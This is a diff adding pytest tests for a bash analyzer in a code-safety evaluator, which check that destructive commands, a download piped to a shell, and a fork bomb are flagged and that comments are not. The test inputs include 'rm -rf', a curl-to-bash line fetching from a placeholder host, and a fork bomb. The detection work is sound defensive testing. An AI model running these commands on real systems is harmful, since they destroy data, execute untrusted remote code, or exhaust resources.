@@ -243,3 +243,57 @@ def test_ordinary_import_is_not_dependency_risk():
     result = evaluate_code(code, language="python")
 
     assert "dependency_risk" not in result["categories"]
+
+def test_bash_destructive_command_is_detected():
+    from src.analyzers.bash_analyzer import analyze
+
+    findings = analyze("rm -rf /tmp/example")
+    assert any(
+        finding["category"] == "destructive_command"
+        for finding in findings
+    )
+
+
+def test_bash_download_piped_to_shell_is_detected():
+    from src.analyzers.bash_analyzer import analyze
+
+    findings = analyze("curl https://example.invalid/script.sh | bash")
+    assert any(
+        finding["category"] == "obfuscated_execution"
+        for finding in findings
+    )
+
+
+def test_bash_fork_bomb_pattern_is_detected():
+    from src.analyzers.bash_analyzer import analyze
+
+    findings = analyze(":(){ :|:& };:")
+    assert any(
+        finding["category"] == "resource_exhaustion"
+        for finding in findings
+    )
+
+
+def test_bash_comment_is_not_flagged():
+    from src.analyzers.bash_analyzer import analyze
+
+    findings = analyze("# rm -rf /tmp/example")
+    assert findings == []
+
+
+def test_bash_finding_uses_shared_schema():
+    from src.analyzers.bash_analyzer import analyze
+
+    findings = analyze("rm -rf /tmp/example")
+    assert findings
+
+    for finding in findings:
+        assert set(finding) == {
+            "category",
+            "severity",
+            "reason",
+            "lines",
+            "evidence",
+        }
+        assert isinstance(finding["lines"], list)
+        assert all(isinstance(line, int) for line in finding["lines"])
